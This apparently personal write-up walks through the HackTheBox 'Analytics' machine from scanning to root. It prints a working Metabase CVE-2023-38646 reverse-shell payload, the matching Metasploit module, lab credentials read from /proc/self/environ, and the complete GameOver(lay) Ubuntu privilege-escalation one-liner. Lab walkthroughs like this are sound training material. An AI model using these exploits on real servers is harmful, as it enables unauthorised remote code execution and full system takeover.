## Summary:
Analytics is a vulnerable Linux machine on HackTheBox. Basic web enumeration techniques expose a login page on a Metabase subdomain. 

This subdomain is exploitable through a known vulnerability `CVE-2023-38646` allowing attackers to gain a foothold.

Privilege escalation to root user is achieved by exploiting another vulnerability called `gameoverlay` on the system.

### Port Scan:

Lets start with nmap scan to discover some open ports.
``` bash
# Nmap 7.80 scan initiated Sat Mar 23 13:40:02 2024 as: nmap -sV -sC -oA analytics 10.129.229.224
Nmap scan report for analytical.htb (10.129.229.224)
Host is up (0.050s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Analytical
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 23 13:40:12 2024 -- 1 IP address (1 host up) scanned in 9.36 seconds
```

With port scan we have port 22 and port 80 open, which is default for SSH and HTTP services, respectively.  

#### Web
I went ahead and browsed the host by pasting in the IP address as we have HTTP service running which resolved to http://analytical.htb/.

I swiftly added the host  analytical.htb to /etc/hosts and went back to web application for further enumeration.  

![img-description](/assets/img/htb/analytics/1.png) _analytical.htb_

As we see there is an option that allow login to the web application, upon visiting the page I was redirected to another page  http:///data.analytical.htb/.

To view the page, we need to add the host to our /etc/hosts. 

![img-description](/assets/img/htb/analytics/2.png) _data.analytical.htb_

Now, as we have the host entry in place, we can see it is a `metabase` login page.

## Foothold:

With some online research, I was able to find a recent vulnerability [CVE-2023-38646] (https://nvd.nist.gov/vuln/detail/CVE-2023-38646). This vulnerability allowed attackers to remotely execute commands on the server running Metabase, without needing any authentication. This means attackers could gain full control of the server if it were vulnerable. 

With further research, I was able to identify a [PoC](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646), which allowed me to gain reverse shell by parsing payload to /api/setup/validate. 

Additionally, there is an alternative method I was able to get reverse shell using `Metasploit` as well.

Let us dive deep into each method! 

### Method 1:  Manually following PoC.   

As described in PoC we would need to obtain the `setup token` from /api/session/properties.   

![img-description](/assets/img/htb/analytics/3.png) _Setup Token_

As we have the setup token, we need to replace it in payload with token value.  

```bash 

{ 
    "token": "<Setup-Token>‚Äù, 
    "details": 
    { 
        "is_on_demand": false, 
        "is_full_sync": false, 
        "is_sample": false, 
        "cache_ttl": null, 
        "refingerprint": false, 
        "auto_run_queries": true, 
        "schedules": 
        {}, 
        "details": 
        { 
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,<you shell payload>}|{base64,-d}|{bash,-i}')\n$$--=x", 
            "advanced-options": false, 
            "ssl": true 
        }, 
        "name": "an-sec-research-team", 
        "engine": "h2" 
    } 
} 

``` 

Now, we needs to encode the reverse shell payload into base64, with your own IP and port, before parsing it.   

![img-description](/assets/img/htb/analytics/4.png) _Complete Payload_

As you can see, we have a reverse shell.

### Method 2: Metasploit Module 

With `msfconsole (Metasploit)` I went ahead and searched for the CVE which revealed a module that can be used to exploit this vulnerability. 

```bash 
msf6 > search CVE-2023-38646

Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce
``` 

I went ahead and configured the Metasploit module as necessary and executed the payload with a `run` command which gave a reverse shell. 

```bash 
msf6 > use exploit/linux/http/metabase_setup_token_rce
[*] Using configured payload cmd/unix/reverse_bash

## Privilege Escalation:

### To User Access:
Now, we are inside the machine, however I was not able to find any relevant that we could use nor a user flag. 

While wondering around enumerating further I checked the /proc/self/environ which gave out credentials for `metalytics` user. 

```bash
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=2a375e88e680
FC_LANG=en-US
SHLVL=5
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase

MB_DB_CONNECTION_URI=

MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=

MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/
MB_DB_FILE=//metabase.db/metabase.db
```
Using the password `An4lytics_ds20223#`, I was able to login to the machine through SSH.

![img-description](/assets/img/htb/analytics/6.png) _SSH: metalytics _

We now own the user of the machine!. 

### From User to Root:

Upon gaining initial access to the Analytical server as the metalytics user, trying to escalate the privilege to root I initially tried `Sudo ‚Äìl` command.  

However, it gave that we do not have permission to run `sudo `on this machine.  

![img-description](/assets/img/htb/analytics/7.png) _sudo -l_

Further I checked if we have any vulnerability related to OS, so I enter the command uname-a to check system information related to Kernel Release Version, OS.   

![img-description](/assets/img/htb/analytics/8.png) _uname -a_
Which revealed that the machine is running on `6.2.0-25-generic` kernel version.  With short online research I could find that this version of kernel version is vulnerable to [CVE-2023-2640 and CVE-2023-32629 ‚ÄúGameOver(lay) Ubuntu Privilege Escalation‚Äù](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main).

Simply by pasting the payload mentioned in exploit.sh file in machine, we will be elevated to root.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
![img-description](/assets/img/htb/analytics/9.png) _rooted_

We have the machine `ROOTED!`
